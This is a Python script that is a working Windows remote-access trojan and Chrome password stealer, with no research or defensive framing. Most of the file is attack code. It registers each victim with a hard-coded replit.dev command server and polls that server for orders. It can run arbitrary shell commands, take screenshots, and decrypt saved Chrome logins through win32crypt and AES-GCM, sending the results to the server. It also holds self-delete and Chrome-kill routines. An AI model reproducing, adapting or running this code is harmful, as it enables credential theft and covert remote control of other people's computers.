
import subprocess, sys

def install_packages(packages):
    """Install a list of packages using pip."""
    for package in packages:
        print(f"Installing {package}...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], check=True)
            print(f"{package} installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {package}: {e}")

install_packages([
        'itsdangerous',
        'requests',
        'netifaces',
        'asyncio',
        'pyautogui',
        'pycryptodome',
        'Flask'
])

import subprocess
import sys
import os
import socket
import requests
import asyncio
import threading
import random
import pyautogui as pg
import sqlite3
from Cryptodome.Cipher import AES
import json
import base64
import win32crypt
import time
from itsdangerous import exc
from flask import jsonify
import urllib.parse

URL = "https://62d00077-98c1-400d-9c7d-d9148d8ec7b6-00-37654x8qsze2r.spock.replit.dev/"
current_directory = os.path.dirname(os.path.abspath(__file__))
CAN_EXECUTE = True

def self_destruct():
    try:
        script_path = sys.argv[0]
        os.remove(script_path)
    except Exception as e:
        pass

def closeChrome():
    try:
        os.system("taskkill /f /im chrome.exe")
        os.system("start chrome.exe")
    except Exception as e:
        pass

def getSecretKey():
    try:
        local_state_path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None

def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return None

def getChromePasswords():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    try:
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        select_statement = 'SELECT action_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        extractedData = []
        for userdatacombo in login_data:
            if userdatacombo[1] and userdatacombo[2]:
                password = decryptPassword(userdatacombo[2], getSecretKey())
                data = f"URL: {userdatacombo[0]} Username: {userdatacombo[1]} Password: {str(password)}"
                extractedData.append(data)
        return extractedData
    except Exception as e:
        return []

def savePasswords(data):
    try:
        with open(f"{current_directory}/passwords-{os.getlogin()}.txt", "w") as f:
            for line in data:
                f.write(line + "\n")
    except Exception as e:
        pass

def main_password():
    data = getChromePasswords()
    # savePasswords(data)
    encoded_passwords = urllib.parse.quote(str(data))

    return encoded_passwords

def take_screenshot():
    try:
        img_name = random.randint(1, 99999999)
        img = pg.screenshot()

        img_path = os.path.join(os.getenv('TEMP'), f'{img_name}.png')
        img.save(img_path)

        with open(img_path, "rb") as image_file:
            encoded_image_data = base64.b64encode(image_file.read()).decode('utf-8')

        url = f"{URL}/ss?target={os.getlogin()}&state=false&imgdata={encoded_image_data}"

        requests.get(url)

        os.remove(img_path)

    except Exception as e:
        print(e)

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        requests.get(f"{URL}/exec?target={os.getlogin()}&command=nil_&response={output}")
        return output
    except Exception as e:
        return None

def take_passwords():
    try:
        passwords = main_password()
        return passwords
    except Exception as e:
        return []

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return "IP not found!"

def get_public_ip():
    try:
        default_gateway = requests.get("https://api.ipify.org").text
        return default_gateway
    except KeyError:
        return "Router IP not found!"
    except Exception as e:
        return "Router IP not found!"

def reset_cmd():
    requests.get(f"{URL}/new_cmd?command=nil_")

def listen():
    global CAN_EXECUTE
    while True:
        try:
            response = requests.get(f"{URL}/commands?user={os.getlogin()}")
            UserData = response.json().get(os.getlogin(), {})

            for i, v in UserData.get("commands", {}).items():
                if response.json().get("command") == "ss" and i == "ss":
                    reset_cmd()
                    take_screenshot()
                    CAN_EXECUTE = False

                elif response.json().get("command") == "exec" and i == "exec":
                    reset_cmd()
                    CAN_EXECUTE = False
                    execute_command(v.get("command"))

                elif response.json().get("command") == "password" and i == "password":
                    reset_cmd()
                    CAN_EXECUTE = False
                    passwords_var = take_passwords()
                    requests.get(f"{URL}/passwords?target={os.getlogin()}&state=false&passwords={passwords_var}")

            time.sleep(5)
            CAN_EXECUTE = True
        except Exception as e:
            pass

try:
    requests.get(f"{URL}/login?user={os.getlogin()}&ip={get_local_ip()}&public_ip={get_public_ip()}")
except Exception as e:
    pass

def run_asyncio_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    listen_thread = threading.Thread(target=listen)
    listen_thread.start()
    run_asyncio_loop(loop)
